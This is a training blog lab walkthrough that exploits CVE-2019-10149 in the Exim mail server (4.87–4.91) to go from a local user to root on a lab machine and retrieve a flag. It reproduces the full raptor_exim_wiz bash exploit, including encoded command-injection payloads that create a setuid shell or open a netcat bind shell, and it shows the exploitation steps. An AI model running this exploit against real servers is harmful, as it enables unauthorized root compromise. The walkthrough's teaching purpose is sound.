[![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27150%27%20height=%2750%27/%3e)![INE
Logo](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)![INE
Logo](/assets/logos/INE-Logo-Orange-White-Revised.svg)](/)

  * [Why INE?](/why-ine)
  * Learning
  * Business Solutions
  * Resources
  * [Pricing & Plans](https://checkout.ine.com)

  * [Sign In](https://my.ine.com/)
  * [Get Started Now](https://checkout.ine.com)
  * [Request Information](https://learn.ine.com/schedule-a-demo)

[![](data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27150%27%20height=%2750%27/%3e)![INE
Logo](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)![INE
Logo](/assets/logos/INE-Logo-Orange-White-Revised.svg)](/)

  * [Why INE?](/why-ine)
  * Learning
  * Business Solutions
  * Resources
  * [Pricing & Plans](https://checkout.ine.com)

  * [Sign In](https://my.ine.com/)
  * [Request Information](https://learn.ine.com/schedule-a-demo)
  * [Get Started Now](https://checkout.ine.com)

[blog ](/blog)

The Return of the WIZard: ...

20 September 22

# The Return of the WIZard: RCE in Exim (CVE-2019–10149)

Posted byINE

![news-featured](https://media.graphassets.com/hyXc4sk3Tgq6lN6MO7jO)

 _In our lab walkthrough series, we go through selected lab exercises on our
INE Platform._[_Subscribe_](https://ine.com/pricing "https://ine.com/pricing")
or _sign up for a_[ _7-day, risk-free trial with
INE_](https://checkout.ine.com/free-trial "https://checkout.ine.com/free-
trial") _and access this lab and a robust library covering the latest in Cyber
Security, Networking, Cloud, and Data Science!_

### **Introduction**

During a code review of the latest changes in the[  _Exim mail
server_](https://en.wikipedia.org/wiki/Exim
"https://en.wikipedia.org/wiki/Exim"), the researchers at Qualys discovered an
RCE vulnerability in versions 4.87 to 4.91 (inclusive). In this particular
case, RCE means Remote  _Command_ Execution, not Remote Code Execution: an
attacker can execute arbitrary commands with **execv()** , as root; no memory
corruption or ROP (Return-Oriented Programming) is involved.

This vulnerability is exploitable instantly by a local attacker (and by a
remote attacker in certain non-default configurations). To remotely exploit
this vulnerability in the default configuration, an attacker must keep a
connection to the vulnerable server open for **7 days** (by transmitting one
byte every few minutes). However, because of the extreme complexity of Exim’s
code, the researchers at Qualys could not guarantee the uniqueness of this
exploitation method and suggest that faster methods of exploiting it remotely
may exist.

**Reference:**[  _https://www.qualys.com/2019/06/05/cve-2019-10149/return-
wizard-rce-exim.txt_](https://www.qualys.com/2019/06/05/cve-2019-10149/return-
wizard-rce-exim.txt "https://www.qualys.com/2019/06/05/cve-2019-10149/return-
wizard-rce-exim.txt")

**Note:** Since this vulnerability is quite hard to exploit remotely, we will
solely be focusing on local exploitation of the Exim mail server in this lab.

In this lab, we will learn how to exploit the[  _local privilege escalation
vulnerability in the Exim mail
server_](https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-
exim.txt "https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-
exim.txt") in a realistic environment to gain root access on the machine.

### **Lab Environment**

In this lab environment, the user is going to get access to an Ubuntu CLI
instance. The provided Ubuntu instance is running a vulnerable version of the
Exim mail server on the default SMTP port (that is, port 25).

**Objective:** Exploit the local privilege escalation vulnerability in the
Exim mail server to gain root access and retrieve the flag!

### **Instructions**

  * The exploitdb database is present in the **/opt/exploitdb** directory.

### **Tools**

The best tools for this lab are:

  * Telnet

  * Netcat

  * Nmap

  * Searchsploit

### **Solution**

**Step 1:** Open the lab link to access the Ubuntu CLI instance.

![the_return_of_the_wizard_cve_2019_10149-1.png](https://media.graphassets.com/78HM8v1RXShY6zpjzCmN)

**Step 2:** Identify processes running on the provided machine.

Check the processes running on the provided instance:

**Command:**

ps aux

![the_return_of_the_wizard_cve_2019_10149-2.png](https://media.graphassets.com/ay6sgXuhS8urzPbL11Ul)

Notice that the Exim mail server is running on this machine.

Locate the Exim mail server binary:

**Commands:**

which exim

ls -al /usr/sbin/exim

ls -al /usr/sbin/exim-4.88-2

![the_return_of_the_wizard_cve_2019_10149-2_1.png](https://media.graphassets.com/8TGP4EQayrbcJ3xDGghw)

Notice that the Exim mail server binary is a setuid root binary.

Also, the Exim mail server version is **4.88.2** , as indicated in the binary
name.

**Step 3:** Identify the port on which the Exim mail server is listening for
connections.

We can use the **ss** command to see the list of ports listening for TCP and
UDP connections:

**Command:**

ss -tulpn

![the_return_of_the_wizard_cve_2019_10149-3.png](https://media.graphassets.com/FXKwx0CQQaIvWbJ7xH6B)

Notice that there is a process listening for connections on port 25 (the
default port used by SMTP servers).

We can confirm that indeed Exim mail server is listening on port 25, using
Nmap:

**Command:**

nmap -sV localhost

![the_return_of_the_wizard_cve_2019_10149-3_1.png](https://media.graphassets.com/oSE47BR0RfS4l5df46Gs)

As you can see in the above output, the Exim mail server is listening for
connections on port 25 (and also on ports 465 and 587).

Notice that Nmap also reports the version of the Exim mail server, that is,
**4.88**.

**Step 4:** Connect to the mail server.

**Command:**

telnet localhost 25

![the_return_of_the_wizard_cve_2019_10149-4.png](https://media.graphassets.com/NpOWFUOSRLGlQBcsVLMI)

The connection was successful, and in the output, we can again see the version
of the Exim mail server, that is, **4.88**.

**Step 5:** Search for the exploits for Exim 4.88.

We will use searchsploit to locate vulnerabilities for the identified version
of the Exim mail server:

**Command:**

searchsploit exim 4.88

![the_return_of_the_wizard_cve_2019_10149-5.png](https://media.graphassets.com/6toSmYitR7S5E4cmanyr)

Notice the highlighted entry. It is a local and remote command execution
vulnerability. Therefore, we can leverage it to perform privilege escalation
on the machine and gain a root shell.

**Note:** The exploitdb database is present in the **/opt/exploitdb**
directory.

The details about this vulnerability can be found in the file
**linux/remote/46974.txt** :

**Command:**

cat /opt/exploitdb/exploits/linux/remote/46974.txt

![the_return_of_the_wizard_cve_2019_10149-5_1.png](https://media.graphassets.com/F9oM555qQle4yofGitvA)

Notice the vulnerability name: **The Return of the WIZard: RCE in Exim
(CVE-2019–10149)**

This file contains the details of this issue and the manual exploitation
steps.

The following is the vulnerable code:

![the_return_of_the_wizard_cve_2019_10149-5_2.png](https://media.graphassets.com/jdTM7ATBWk12iUpFgjSw)

****

![the_return_of_the_wizard_cve_2019_10149-5_3.png](https://media.graphassets.com/Po9XBZhTMeCV2go8idft)

**Step 6:** Locate and save the exploit for local privilege escalation (LPE)
vulnerability in Exim.

Open the following URL in your browser:

**URL:**[  _https://packetstormsecurity.com/files/153312/Exim-4.91-Local-
Privilege-
Escalation.html_](https://packetstormsecurity.com/files/153312/Exim-4.91-Local-
Privilege-Escalation.html
"https://packetstormsecurity.com/files/153312/Exim-4.91-Local-Privilege-
Escalation.html")

![the_return_of_the_wizard_cve_2019_10149-6.png](https://media.graphassets.com/JaDjixhnTCi6BPNKgPIr)

It contains a bash script to exploit the Exim LPE vulnerability:

**Exploit script:**

    
    
    #!/bin/bash
    #
    # raptor_exim_wiz - "The Return of the WIZard" LPE exploit
    # Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
    #
    # A flaw was found in Exim versions 4.87 to 4.91 (inclusive).
    # Improper validation of recipient address in deliver_message()
    # function in /src/deliver.c may lead to remote command execution.
    # (CVE-2019-10149)
    #
    # This is a local privilege escalation exploit for "The Return
    # of the WIZard" vulnerability reported by the Qualys Security
    # Advisory team.
    #
    # Credits:
    # Qualys Security Advisory team (kudos for your amazing research!)
    # Dennis 'dhn' Herrmann (/dev/tcp technique)
    #
    # Usage (setuid method):
    # $ id
    # uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]
    # $ ./raptor_exim_wiz -m setuid
    # Preparing setuid shell helper...
    # Delivering setuid payload...
    # [...]
    # Waiting 5 seconds...
    # -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned
    # # id
    # uid=0(root) gid=0(root) groups=0(root)
    #
    # Usage (netcat method):
    # $ id
    # uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]
    # $ ./raptor_exim_wiz -m netcat
    # Delivering netcat payload...
    # Waiting 5 seconds...
    # localhost [127.0.0.1] 31337 (?) open
    # id
    # uid=0(root) gid=0(root) groups=0(root)
    #
    # Vulnerable platforms:
    # Exim 4.87 - 4.91
    #
    # Tested against:
    # Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]
    #
    METHOD="setuid" # default method
    PAYLOAD_SETUID='${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost'
    PAYLOAD_NETCAT='${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22}}@localhost'
    # usage instructions
    function usage()
    {
     echo "$0 [-m METHOD]"
     echo
     echo "-m setuid : use the setuid payload (default)"
     echo "-m netcat : use the netcat payload"
     echo
     exit 1
    }
    # payload delivery
    function exploit()
    {
     # connect to localhost:25
     exec 3<>/dev/tcp/localhost/25
     # deliver the payload
     read -u 3 && echo $REPLY
     echo "helo localhost" >&3
     read -u 3 && echo $REPLY
     echo "mail from:<>" >&3
     read -u 3 && echo $REPLY
     echo "rcpt to:<$PAYLOAD>" >&3
     read -u 3 && echo $REPLY
     echo "data" >&3
     read -u 3 && echo $REPLY
     for i in {1..31}
     do
       echo "Received: $i" >&3
     done
     echo "." >&3
     read -u 3 && echo $REPLY
     echo "quit" >&3
     read -u 3 && echo $REPLY
    }
    # print banner
    echo
    echo 'raptor_exim_wiz - "The Return of the WIZard" LPE exploit'
    echo 'Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>'
    echo
    # parse command line
    while [ ! -z "$1" ]; do
     case $1 in
       -m) shift; METHOD="$1"; shift;;
       * ) usage
       ;;
     esac
    done
    if [ -z $METHOD ]; then
     usage
    fi
    # setuid method
    if [ $METHOD = "setuid" ]; then
     # prepare a setuid shell helper to circumvent bash checks
     echo "Preparing setuid shell helper..."
     echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" >/tmp/pwned.c
     gcc -o /tmp/pwned /tmp/pwned.c 2>/dev/null
     if [ $? -ne 0 ]; then
       echo "Problems compiling setuid shell helper, check your gcc."
       echo "Falling back to the /bin/sh method."
       cp /bin/sh /tmp/pwned
     fi
     echo
     # select and deliver the payload
     echo "Delivering $METHOD payload..."
     PAYLOAD=$PAYLOAD_SETUID
     exploit
     echo
     # wait for the magic to happen and spawn our shell
     echo "Waiting 5 seconds..."
     sleep 5
     ls -l /tmp/pwned
     /tmp/pwned
    # netcat method
    elif [ $METHOD = "netcat" ]; then
     # select and deliver the payload
     echo "Delivering $METHOD payload..."
     PAYLOAD=$PAYLOAD_NETCAT
     exploit
     echo
     # wait for the magic to happen and spawn our shell
     echo "Waiting 5 seconds..."
     sleep 5
     nc -v 127.0.0.1 31337
    # print help
    else
     usage
    fi

Save the above exploitation script as **exploit.sh**.

![the_return_of_the_wizard_cve_2019_10149-6_1.png](https://media.graphassets.com/WJmENVDyQsKKqlbKEXQd)

**Step 7:** Exploit the local privilege escalation (LPE) vulnerability in Exim
to gain a root shell.

Launch the exploitation script saved in the last step:

**Commands:**

id

bash exploit.sh

![the_return_of_the_wizard_cve_2019_10149-7.png](https://media.graphassets.com/S29McgKxSBuAY7OK9UTW)

Notice that before running the exploit, we were running as a local (low-
privileged) user named **miley**.

Wait for 5 seconds, and that should give you a root shell:

![the_return_of_the_wizard_cve_2019_10149-7_1.png](https://media.graphassets.com/YLVWPq70QhSgb4ezFHKT)

Run the **id** command again:

**Command:**

id

![the_return_of_the_wizard_cve_2019_10149-7_2.png](https://media.graphassets.com/FQJ0UhjPTFKvuqprCYG0)

Notice that we have a root shell now. So the local privilege escalation was
successful!

**Step 8:** Retrieve the flag.

Locate the flag:

**Command:**

find / -iname *flag* 2>/dev/null

![the_return_of_the_wizard_cve_2019_10149-8.png](https://media.graphassets.com/3fg2AJWRDqZXE8Seivw0)

The flag is located in the **/root/FLAG** file.

Retrieve the flag:

**Command:**

cat /root/FLAG

![the_return_of_the_wizard_cve_2019_10149-8_1.png](https://media.graphassets.com/pr2QUz5YTd2taybO2NrM)

**FLAG:** c04e268fa67c485b895c57cd0c7b42b0

With that, we conclude this lab on a local privilege escalation vulnerability
in the Exim mail server.

We have seen how easy it is to exploit this local privilege escalation
vulnerability and obtain a root shell.

### **References**

  * [ _The Return of the WIZard: RCE in Exim (CVE-2019–10149)_](https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt "https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt")

  * [_Exim 4.91 Local Privilege Escalation_](https://packetstormsecurity.com/files/153312/Exim-4.91-Local-Privilege-Escalation.html "https://packetstormsecurity.com/files/153312/Exim-4.91-Local-Privilege-Escalation.html")

 _Want to try this lab hands-on?_[_Subscribe_](https://ine.com/pricing
"https://ine.com/pricing") or _sign up for a_[ _7-day, risk-free trial with
INE_](https://checkout.ine.com/free-trial "https://checkout.ine.com/free-
trial") _to access this lab and a robust library covering the latest in Cyber
Security, Networking, Cloud, and Data Science!_

About

  * About Us
  * Contact Us
  * Careers
  * Become An Instructor
  * Our Platform
  * Community
  * INE Live
  * Newsroom
  * Blog

Learning

  * Why INE?
  * Networking
  * Cyber Security
  * Data Science
  * Cloud
  * Learning Paths
  * Courses
  * Instructors

Plans

  * Pricing & Plans
  * Business Solutions

Support

  * Help Center

## Need training for your entire team?

[Schedule a Demo](https://learn.ine.com/schedule-a-demo)

## Hey! Don’t miss anything - subscribe to our newsletter!

Email

Subscribe

© 2022 INE. All Rights Reserved. All logos, trademarks and registered
trademarks are the property of their respective owners.

Terms of servicePrivacy policy

